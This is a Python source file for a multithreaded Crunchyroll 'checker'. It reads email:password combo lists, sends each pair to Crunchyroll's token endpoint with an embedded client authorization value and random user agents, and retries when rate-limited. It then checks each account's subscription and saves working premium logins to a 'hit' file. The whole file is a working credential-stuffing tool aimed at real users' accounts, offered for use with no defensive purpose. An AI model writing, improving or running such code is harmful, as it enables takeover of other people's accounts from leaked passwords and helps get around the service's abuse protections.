from urllib import request, parse, error
import re
import json
import time
import random
import logging
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

# Regex to match email:password combinations
regexEmailPassCombo = r'[\w\.]+@[\w\.]+:[\S]+'

class CrunchyrollChecker:
    def __init__(self, filename, max_workers=10, base_delay=10):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.ua = UserAgent()
        self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURMeXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename
        self.result_files = self._result_file()
        self.max_workers = max_workers
        self.base_delay = base_delay
        self.processed_credentials = set()  # To skip duplicates
        self.request_count = 0
        self.error_count = 0

        # Configure logging
        logging.basicConfig(filename='checker.log', level=logging.INFO)

    @classmethod
    def create(cls, filename: str, max_workers=10, base_delay=10):
        self = CrunchyrollChecker(filename, max_workers, base_delay)
        self._checker()

    def _result_file(self):
        resultDir = 'result//'
        return {
            'hit': open(f'{resultDir}hit.txt', 'a'),
            'free': open(f'{resultDir}free.txt', 'a'),
            'invalid': open(f'{resultDir}invalid.txt', 'a'),
            'error': open(f'{resultDir}error.txt', 'a')
        }

    def _checker(self):
        with open(self.filename) as file:
            lines = file.readlines()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            executor.map(self._try_login_from_line, lines)

    def _try_login_from_line(self, line):
        loginDetail = self._filter_email_pass(line)
        if loginDetail:
            credential_tuple = tuple(loginDetail)  # (email, password)
            if credential_tuple not in self.processed_credentials:
                self.processed_credentials.add(credential_tuple)  # Mark as processed
                self.email, self.password = loginDetail
                self._try_to_login()

    def _make_request(self, url, headers=None, data=None):
        if data:
            data = parse.urlencode(data).encode()
        req = request.Request(url, headers=headers, data=data)
        return req

    def _parse_response(self, res):
        res = res.read().decode('utf-8')
        return json.loads(res)

    def _try_to_login(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = {
            "User-Agent": self.ua.random,
            "authorization": self.auth,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/plain, */*"
        }

        req = self._make_request(self.apiUrl + "auth/v1/token", headers, data)

        try:
            res = request.urlopen(req)
            self.request_count += 1
            resData = self._parse_response(res)
            accessToken = resData.get('access_token')
            if accessToken:
                self._premium_checker(accessToken)
            else:
                self._result_saving('error', f'Access token not found: {resData}')
        except error.HTTPError as e:
            self.error_count += 1
            self._handle_http_error(e)
        except Exception as e:
            self._result_saving('error', str(e))

    def _handle_http_error(self, e):
        if e.code == 401:
            self._result_saving('invalid')
        elif e.code == 429:
            logging.warning('Rate limit exceeded, sleeping for a while.')
            time.sleep(self.base_delay)  # Rate limiting
            self._try_to_login()  # Retry after delay
        else:
            self._result_saving('error', f'HTTPError: {e}')

    def _filter_email_pass(self, line):
        loginDetail = re.findall(regexEmailPassCombo, line)
        if loginDetail:
            return loginDetail[0].split(':')
        return None

    def _result_saving(self, file_type='error', error_msg=None):
        file_ref = self.result_files[file_type]
        message = f"{self.email}:{self.password}"

        if error_msg:
            message += f' {Fore.RED}{error_msg}{Fore.WHITE}'
        else:
            if file_type == 'hit':
                message += f' {Fore.GREEN}Hit Found! 🎉{Fore.WHITE}'
            elif file_type == 'free':
                message += f' {Fore.CYAN}Free Account Found!{Fore.WHITE}'
            elif file_type == 'invalid':
                message += f' {Fore.RED}Invalid Account!{Fore.WHITE}'

        print(message)
        file_ref.write(message + '\n')
        file_ref.flush()

        # Log the result
        logging.info(message)

    def _premium_checker(self, accessToken):
        header = {
            "User-Agent": self.ua.random,
            "authorization": f"Bearer {accessToken}",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/plain, */*"
        }
        externalID = self._get_external_id(header)
        if externalID:
            self._subscription_checker(header, externalID)

    def _get_external_id(self, header):
        req = self._make_request(self.apiUrl + 'accounts/v1/me', headers=header)
        try:
            res = request.urlopen(req)
            resData = self._parse_response(res)
            return resData.get('external_id')
        except error.HTTPError as e:
            self._result_saving('error', f'Error while getting external ID: {e}')
        except Exception as e:
            self._result_saving('error', str(e))
        return None

    def _subscription_checker(self, header, externalID):
        req = self._make_request(self.apiUrl + f'subs/v1/subscriptions/{externalID}/products', headers=header)
        try:
            res = request.urlopen(req)
            resData = self._parse_response(res)
            if resData['total']:
                self._result_saving('hit')
            else:
                self._result_saving('free')
        except error.HTTPError as e:
            if e.code == 404:
                self._result_saving('free')
            else:
                self._result_saving('error', f'Error while checking subscription: {e}')
        except Exception as e:
            self._result_saving('error', str(e))

    def close_files(self):
        for file_ref in self.result_files.values():
            file_ref.close()
